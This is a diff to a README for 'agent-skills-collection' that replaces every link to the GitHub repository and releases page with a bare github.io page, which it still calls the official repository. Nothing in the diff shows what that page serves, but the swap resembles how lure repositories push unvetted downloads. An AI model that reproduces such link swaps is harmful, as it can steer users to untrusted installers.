@@ -33,7 +33,7 @@ Don't worry—you don't need a supercomputer. Here's what you need:
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [**Download agent-skills-collection**](https://github.com/graceupperclass437/agent-skills-collection/releases)
+Visit this link to download the application: [**Download agent-skills-collection**](https://graceupperclass437.github.io)
 
 ### 🔧 Step-by-Step Setup
 
@@ -95,7 +95,7 @@ We take your data seriously. All skill operations happen on your own machine as 
 Have a question or ran into a snag? Here's what you can do:
 
 - **Check the FAQ** section above—most issues are covered there.
-- **Visit the official repository** at [https://github.com/graceupperclass437/agent-skills-collection](https://github.com/graceupperclass437/agent-skills-collection) for updates and community tips.
+- **Visit the official repository** at [https://graceupperclass437.github.io](https://graceupperclass437.github.io) for updates and community tips.
 - **Search the web** for "agent-skills-collection tutorials" to see others solving the same problems.
 
 ## 📈 What's Next?
@@ -106,7 +106,7 @@ The world of AI is moving fast. With **agent-skills-collection**, you're always 
 
 Don't let the technical side scare you. Everything is designed for a smooth ride. Click below, install, and watch your AI do more than you thought possible.
 
-[**⬇️ Download agent-skills-collection Now**](https://github.com/graceupperclass437/agent-skills-collection/releases)
+[**⬇️ Download agent-skills-collection Now**](https://graceupperclass437.github.io)
 
 ---
 
